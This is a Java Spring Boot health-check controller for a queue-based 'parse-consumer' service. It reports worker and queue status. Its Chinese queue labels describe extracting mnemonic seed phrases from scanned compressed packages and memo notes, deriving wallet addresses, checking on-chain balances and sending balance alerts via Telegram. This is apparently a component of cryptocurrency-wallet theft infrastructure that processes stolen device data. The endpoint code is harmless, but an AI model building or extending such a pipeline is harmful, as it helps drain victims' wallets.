package com.consumer.web;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import com.consumer.config.DispatchPoolSnapshot;
import com.consumer.config.V26ConsumerProperties;
import com.consumer.worker.ConsumerWorkerRegistry;
import com.consumer.worker.QueueLagMonitor;
import com.consumer.worker.RedisListWorker;

import lombok.RequiredArgsConstructor;

@RestController
@RequiredArgsConstructor
public class ReadyController {

    private final V26ConsumerProperties props;
    private final ConsumerWorkerRegistry registry;
    private final QueueLagMonitor lagMonitor;
    private final DispatchPoolSnapshot dispatchPoolSnapshot;

    @GetMapping({"/", "/health", "/api/v1/system/ready", "/api/v2/system/ready"})
    public Map<String, Object> ready() {
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("service", "26-consumer-server");
        data.put("role", "parse-consumer");
        data.put("deferBalance", props.getConsumer().isDeferBalance());
        data.put("deriveCount", props.getConsumer().getDeriveCount());
        Map<String, String> queueRole = new LinkedHashMap<>();
        queueRole.put(props.getQueue().getDeviceParse(), "V2 扫压缩包/提取助记词入库（不查链）");
        queueRole.put(props.getQueue().getDeviceParseV1(), "V1 扫压缩包/提取助记词入库（不查链）");
        queueRole.put(props.getQueue().getMnemonicBalance(), "V2 派生地址 + 查链余额 + 余额飞机");
        queueRole.put(props.getQueue().getMnemonicBalanceV1(), "V1 派生地址 + 查链余额 + 余额飞机");
        queueRole.put(props.getQueue().getNotesMnemonic(), "V2 备忘录提取助记词");
        queueRole.put(props.getQueue().getNotesMnemonicV1(), "V1 备忘录提取助记词");
        queueRole.put(props.getQueue().getPackageAddress(), "V2 包内缓存地址和余额");
        queueRole.put(props.getQueue().getPackageAddressV1(), "V1 包内缓存地址和余额");
        queueRole.put(props.getQueue().getTgMessage(), "发送飞机消息");
        data.put("queueRole", queueRole);
        data.put("queues", lagMonitor.queueLens());
        List<Map<String, Object>> workers = new ArrayList<>();
        for (RedisListWorker w : registry.all()) {
            workers.add(w.snapshot());
        }
        data.put("workers", workers);
        data.put("dispatch", dispatchPoolSnapshot.snapshot());
        Map<String, Object> body = new LinkedHashMap<>();
        body.put("code", 0);
        body.put("message", "ok");
        body.put("data", data);
        return body;
    }
}
